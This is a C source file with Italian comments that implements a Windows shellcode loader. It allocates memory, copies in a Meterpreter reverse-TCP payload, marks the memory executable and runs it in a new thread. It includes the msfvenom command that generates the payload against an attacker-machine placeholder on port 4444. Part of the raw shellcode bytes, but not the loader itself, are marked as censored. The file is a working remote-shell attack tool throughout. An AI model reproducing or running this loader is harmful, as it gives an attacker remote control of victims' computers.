#include <windows.h>
#include <stdio.h>

// Questo Ã¨ il contenitore per il nostro payload grezzo
// Si genera con il comando: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_MACCHINA_ATTACCANTE> LPORT=4444 -f c
unsigned char payload[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x56\x48\x8b\x52"
[...CENSORED...]          
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";

int main(void) {
    void * alloc_mem;
    BOOL retval;
    HANDLE threadHandle;
    DWORD oldprotect = 0;

    // 1. Chiediamo a Windows di allocare uno spazio di memoria RAM.
    alloc_mem = VirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 2. Copiamo il nostro shellcode grezzo dentro la memoria appena allocata.
    RtlMoveMemory(alloc_mem, payload, sizeof(payload));

    // 3. La magia: cambiamo i permessi della memoria in "PAGE_EXECUTE_READ".
    retval = VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldprotect);

    // 4. Creiamo un nuovo "Thread" che esegue le istruzioni dalla RAM.
    if ( retval != 0 ) {
        threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
        // Aspettiamo all'infinito per non far chiudere l'eseguibile e perdere la shell
        WaitForSingleObject(threadHandle, -1);
    }

    return 0;
}